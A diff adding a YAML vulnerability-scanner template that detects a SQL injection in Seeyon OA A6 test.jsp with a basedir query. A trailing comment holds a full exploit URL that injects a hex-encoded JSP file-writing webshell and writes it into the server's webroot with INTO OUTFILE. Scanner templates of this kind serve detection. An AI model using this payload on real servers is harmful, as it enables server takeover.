@@ -1,0 +1,31 @@
+id: A6 test.jsp SQL注入漏洞
+time: "2023-03-19-22:23"
+
+info:
+  severity: critical
+  description: 致远OA A6 test.jsp 存在sql注入漏洞，并可以通过注入写入webshell文件控制服务器
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247485042&idx=1&sn=3dfac475ca4db76b412ed7c546e273a0
+  remediation: Apply the appropriate patch.
+  tags: zhiyuan,rce,fileupload,seeyon,intrusive
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "UFseeyon/OA"
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/02/04
+#http://xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(select unhex('3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E')  into outfile 'D:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/test_upload.jsp
